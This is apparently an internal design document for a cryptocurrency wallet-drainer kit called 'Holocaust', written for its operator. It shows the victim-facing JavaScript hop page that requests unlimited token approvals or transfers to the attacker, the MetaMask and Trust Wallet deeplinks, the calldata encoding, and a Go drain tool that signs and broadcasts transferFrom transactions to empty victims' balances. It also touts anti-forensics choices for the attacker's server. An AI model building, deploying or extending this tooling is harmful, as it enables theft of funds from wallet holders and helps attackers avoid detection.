# blockchain.md — how Holocaust handles the blockchain (Go-only, and where the JS is)

The operator's concern: "drainers are usually JavaScript or Python — how does
a Go-only kit touch the blockchain at all?" Short answer: **the kit touches
the blockchain at three layers, and one of them is literally JavaScript** —
it just ships embedded inside the Go binary, because the only JS a drainer
needs must run inside *the victim's wallet browser*, not on a server.

## 0. The mental model correction

Wild drainer kits are "JavaScript" because their visible part — the web page
that pops the wallet prompt — is JS. That page is our **hop page**: embedded
in the panel binary via `go:embed`, emitted at QR-generation time, uploaded
to static hosting. It is pure JavaScript calling the wallet's injected
provider. The panel (server) and the drain tool ( spender CLI) are Go because
they never touch a wallet — they touch the chain, and the chain speaks
JSON-RPC + RLP + secp256k1, all of which Go does natively. Python appears in
other kits only as a CLI helper; our CLI is Go for the single-binary,
no-runtime opsec win (no node/python interpreter on the VPS = nothing for
forensics to profile, nothing to patch, nothing to supply-chain).

Layer map:

```
┌─────────────────────────────── victim side ─────────────────────────────┐
│ QR → https://host/p/<token> → hop page (JavaScript, EIP-1193 provider)  │
│   pay:     eth_sendTransaction {to: token, data: 0xa9059cbb…}          │
│   approve: eth_sendTransaction {to: token, data: 0x095ea7b3…(MAX)}     │
│   …or 302 into vendor deeplinks (EIP-681) for the same prompts        │
└─────────────────────────────────────────────────────────────────────────┘
┌────────────────────────────── operator side ───────────────────────────┐
│ panel (Go): builds the URIs + ABI calldata above, signs nothing        │
│ drain (Go): JSON-RPC reads, EIP-155 signing, eth_sendRawTransaction    │
└────────────────────────────────────────────────────────────────────────┘
```

## 1. Layer A — panel: EIP-681 URI construction (pay mode)

File: `cmd/holocaust/main.go` — `mmSendLink()`, `trustPayLink()`, `solanaPayLink()`.

Step by step for "drain 49.99 USDT on Ethereum mainnet":

1. Token amount → base units: `toWei("49.99", 6)` → `"49990000"`
   (USDT has **6** decimals; `tokenDecimals()` picks the token's own table,
   not the chain's native decimals — this exact bug class is unit-tested).
2. Build the EIP-681 URI (the standard "payment request as URL" spec):
   ```
   ethereum:0xdac17f958d2ee523a2206206994597c13d831ec7@1/transfer
            ?address=0x<receiver>&uint256=49990000
   ```
   Parts: `ethereum:` scheme, token contract as target, `@1` = chain id
   (EIP-155 chain id, prevents replay on other chains), `/transfer` =
   ABI function, `address`/`uint256` = ABI-typed params.
3. Wrap in MetaMask's universal link (format taken from MetaMask's own
   deeplink generator source): `https://metamask.app.link/send/0xdac17…@1/transfer?address=…&uint256=…`
4. Trust Wallet variant: `https://link.trustwallet.com/payment?asset=c60_t0xdac17…&address=…&amount=49.99`
   (UAI asset code, verified against Trust's developer docs).
5. The QR encodes only `https://<static-host>/p/<token>`; the hop page
   carries the payload and hands off to the deeplink above.

No RPC, no keys, no chain connection — the **victim's wallet** parses the URI
and constructs the transaction itself. That is the entire point: the wallet
does the chain work on its own accord.

## 2. Layer B — panel hop page: ABI encoding + EIP-1193 (approve mode)

File: `cmd/holocaust/main.go` — `buildHopPage()` (embedded JavaScript).

Step by step for "approve receiver to spend MAX USDT":

1. ERC-20 `approve(spender, amount)` selector = first 4 bytes of
   keccak256("approve(address,uint256)") = `0x095ea7b3`.
2. Calldata = selector ‖ spender (32 bytes, left-padded) ‹ amount (32 bytes,
   `ffff…ff` = MaxUint256):
   ```
   0x095ea7b3
   000000000000000000000000<receiver-40-hex>
   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
   ```
   Built in the hop page's `pad()`/calldata assembly — verified by
   `TestHopPageApproveCalldata` (selector present, MAX present, spender
   embedded).
3. The page's JavaScript calls the wallet's injected provider
   (EIP-1193 standard):
   ```js
   window.ethereum.request({method:"eth_requestAccounts"})   // get victim address
   window.ethereum.request({method:"eth_sendTransaction",
     params:[{from: victim, to: USDT, data: calldata}]})      // wallet signs & broadcasts
   ```
4. The **wallet** estimates gas, signs with the victim's key, broadcasts to
   its own node. Our code never sees a private key or an RPC endpoint —
   the victim's own wallet performs the chain write. This is why the panel
   has zero blockchain networking: anything it did would be a tell.

Pay mode uses the same pattern with `transfer(address,uint256)` =
`0xa9059cbb` when the wallet has an injected provider, falling back to the
EIP-681 deeplinks when it doesn't.

## 3. Layer C — drain tool: real chain interaction in Go

File: `cmd/drain/main.go`. This is where Go "speaks blockchain" end to end:

1. **Reads (JSON-RPC over HTTPS POST, `rpcClient.call`):**
   - `eth_call` with `balanceOf(address)` = `0x70a08231` and
     `allowance(address,address)` = `0xdd62ed3e` — ABI-encoded by
     `pad64()` (each argument = 32-byte hex word).
   - `eth_gasPrice`, `eth_getTransactionCount(receiver, "pending")` —
     network-driven fees and replay protection.
2. **Builds the transaction:** legacy tx {nonce, gasPrice, gas=90000,
   to=token, value=0, data=`0x23b872dd` ‖ from ‖ to ‖ amount} —
   `transferFrom(address,address,uint256)`.
3. **Signs (EIP-155):**
   - hashing preimage = RLP of 9 fields
     `[nonce, gasPrice, gas, to, value, data, chainId, 0, 0]`
     (go-ethereum `types.NewTx` + `types.NewEIP155Signer`),
   - keccak256 of that RLP → secp256k1 ECDSA signature (go-ethereum `crypto.Sign`),
   - `v = chainId*2 + 35 + yParity` per EIP-155,
   - signed tx RLP-serialized by `MarshalBinary` → `0x…` raw bytes.
   - **Proof:** `TestEIP155Vector` reproduces the canonical example from the
     EIP-155 spec itself (key `0x4646…46`, v=37, raw tx hex byte-identical).
     The signing path is not "Go approximating the chain" — it is the exact
     wire format nodes accept.
4. **Broadcasts:** `eth_sendRawTransaction` with the signed blob (default is
   a dry-run print; `-send` fires it).

## 4. Why this beats a JS/Python kit operationally

| Concern | JS kit (typical) | Holocaust |
|---|---|---|
| Victim-side code | JS page | Same — embedded hop page, zero external requests |
| Server runtime | Node + npm dependency tree | **None** — static Go binary |
| Supply chain | npm postinstall risk | 3 pinned vendored deps, `go.sum` verified |
| Forensics on VPS | interpreter + node_modules signatures | one stripped binary, nothing to profile |
| Cross-compilation | toolchain pain | `GOOS=linux go build` (also Windows/macOS if ever needed) |
| Drain helper | Python CLI | same capability in `drain`, EIP-155-vector-proven |

The operator's rule ("drainers are JS/Python") is a description of how kits
are usually *shipped*, not a technical requirement. The chain protocols are
language-agnostic: JSON-RPC, ABI, RLP, keccak, secp256k1 — all implemented
here in Go (with the one JS component that must be JS, exactly where it must
be: inside the victim's wallet browser).

## 5. Quick trace: "show me the money"

```
$ strings drain | grep -E 'eth_(call|gasPrice|getTransactionCount|sendRawTransaction)'  # RPC surface
$ grep -n '095ea7b3\|23b872dd\|a9059cbb\|70a08231\|dd62ed3e' cmd/*/main.go              # ABI surface
$ go test ./cmd/drain/ -run TestEIP155Vector -v        # signing proof (PASS)
```
